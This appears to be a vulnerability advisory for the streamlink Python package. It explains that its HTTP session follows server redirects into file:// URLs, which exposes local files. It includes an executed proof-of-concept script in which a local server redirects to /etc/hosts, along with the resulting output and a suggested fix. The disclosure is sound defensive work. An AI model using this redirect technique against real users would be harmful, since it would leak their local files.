@@ -1,0 +1,102 @@
+PYSEC-2026-4172 PyPI/streamlink — Streamlink: HTTPSession follows HTTP redirects into file:// URLs, reading local files
+package: streamlink
+ecosystem: PyPI
+versions affected:
+  >= 0, < 8.6.0 (ECOSYSTEM)
+aliases: CVE-2026-92164, GHSA-vf2x-4v53-pm7v
+references:
+  https://github.com/streamlink/streamlink/security/advisories/GHSA-vf2x-4v53-pm7v
+  https://nvd.nist.gov/vuln/detail/CVE-2026-92164
+  https://github.com/streamlink/streamlink/commit/4b99c64dde21ea70c24d9ffdbd15849b05f465c6
+  https://github.com/streamlink/streamlink
+  https://github.com/streamlink/streamlink/releases/tag/8.6.0
+  https://pypi.org/project/streamlink
+  https://github.com/advisories/GHSA-vf2x-4v53-pm7v
+
+## Summary
+
+`HTTPSession` mounts a `FileAdapter` for the `file://` scheme and inherits redirect handling
+unchanged from `requests.Session`. `requests` does not check for scheme downgrades or
+cross-protocol transitions when it follows a redirect, so any http(s) request Streamlink makes can
+be redirected by the remote server into `file:///...` and the local file is returned as the
+response body.
+
+`GHSA-hgqw-6m45-hw5f` / `CVE-2026-44353` fixed direct `file://` segment and playlist URIs in HLS
+playlists and DASH manifests. Those checks look at the URL as it appears in the manifest, so a
+manifest that lists an ordinary `https://` URL passes them, and the redirect happens later at fetch
+time. The attack surface is the same one that advisory describes, but the flaw is one level down in
+`HTTPSession` rather than in the streaming implementations, so it applies to every request the
+session makes and not only to segment and manifest fetches.
+
+## Affected version
+
+Executed against released `streamlink 8.5.0` (PyPI, installed into a clean venv on
+Python 3.12).
+
+## Attacker model
+
+The attacker controls a URL the victim's Streamlink run reaches: a playlist or manifest URL passed
+on the command line, or any http(s) URL referenced from attacker-controlled manifest content. No
+privileges on the victim host and no `file://` input are required, and the `file://` scheme never
+appears in anything the victim or the manifest parser sees.
+
+## Proof of concept, executed
+
+```python
+import threading
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+from streamlink.exceptions import StreamError
+from streamlink.session.http import HTTPSession
+
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/segment":
+            self.send_response(302)
+            self.send_header("Location", "file:///etc/hosts")
+            self.end_headers()
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def log_message(self, *a):
+        pass
+
+srv = HTTPServer(("127.0.0.1", 0), H)
+port = srv.server_port
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+s = HTTPSession()
+res = s.get(f"http://127.0.0.1:{port}/segment", exception=StreamError, timeout=5)
+print("requested   http://127.0.0.1:%d/segment" % port)
+print("final_url  ", res.url)
+print("status     ", res.status_code)
+print("content    ", res.content[:40])
+srv.shutdown()
+```
+
+Output:
+
+```text
+requested   http://127.0.0.1:52205/segment
+final_url   file:///etc/hosts
+status      200
+content     b'##\n# Host Database\n#\n# localhost is used'
+```
+
+The request goes out over http, the response comes back from the local filesystem, and nothing in
+between rejects the scheme change. Substituting a path the attacker wants read for `/etc/hosts`
+returns that file's contents into whatever consumes the response, which for a segment fetch means
+the file is written into the stream output.
+
+## Suggested fix
+
+Override `get_redirect_target()` or `resolve_redirects()` on `HTTPSession` and reject a redirect
+whose target scheme is not the same as the request's scheme or a permitted upgrade of it. Doing it
+on the session rather than through a response hook keeps plugin authors from removing the check by
+overriding hooks. Custom protocol adapters can still redirect, but only to `https` or to their own
+scheme.
+
+### AI tooling
+
+AI assistance was used for the code audit and for drafting this report. The finding was manually verified against the project's source at the location cited above before reporting it, and the severity and impact assessment are my own.
